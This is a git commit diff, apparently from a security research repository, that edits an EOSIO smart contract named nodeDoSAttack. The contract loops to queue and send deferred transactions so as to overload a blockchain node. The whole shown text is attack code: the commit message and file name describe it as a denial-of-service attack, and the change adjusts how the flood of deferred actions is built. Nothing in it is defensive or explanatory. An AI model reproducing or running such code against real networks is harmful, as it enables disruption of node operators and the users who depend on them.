4be0c80aca60a841d2f6fc79b851f4436e8acc8f
k1rh4 <k1rh4.lee@gmail.com>
2019-05-18 09:07:26 +0900

    Node Dos Attack

--- RUN_NODE/SCRIPT/nodeDoSAttack/nodeDoSAttack.cpp
+++ RUN_NODE/SCRIPT/nodeDoSAttack/nodeDoSAttack.cpp
@@ -21,17 +21,17 @@ class [[eosio::contract]] nodeDoSAttack : public eosio::contract {
 
             //name client = name("reset");
 
-            out1.actions.emplace_back(permission_level{client, "active"_n}, client, "func"_n,std::make_tuple( client,  uint64_t(1)) );
-            out2.actions.emplace_back(permission_level{client, "active"_n}, client, "func"_n,std::make_tuple( client, uint64_t(2)) );
+           // out1.actions.emplace_back(permission_level{client, "active"_n}, client, "func"_n,std::make_tuple( client,  uint64_t(1)) );
+           // out2.actions.emplace_back(permission_level{client, "active"_n}, client, "func"_n,std::make_tuple( client, uint64_t(2)) );
             for(int i =0; i<3; i++){ // 1,2,3 / 2
-                out1.actions.pop_back();
+            //    out1.actions.pop_back();
                 out1.actions.emplace_back(permission_level{client, "active"_n}, client, "func"_n, std::make_tuple(client, uint64_t(initnum+(idx)+i) ));
                 //out.delay_sec = 0;
                 out1.send((initnum+idx+i), client, false);
                 print("[+] CALL 1st: ", ((idx)+i), "\n");
             }
             for (int i = 0; i<3; i++){ // 5,6,7 /
-                out2.actions.pop_back();
+            //    out2.actions.pop_back();
                 out2.actions.emplace_back(permission_level{client, "active"_n}, client, "func"_n, std::make_tuple(client, uint64_t(initnum+(idx*5)+i) ));
                 //out2.delay_sec = 0;
                 out2.send((initnum+(idx*5)+i), client, false);
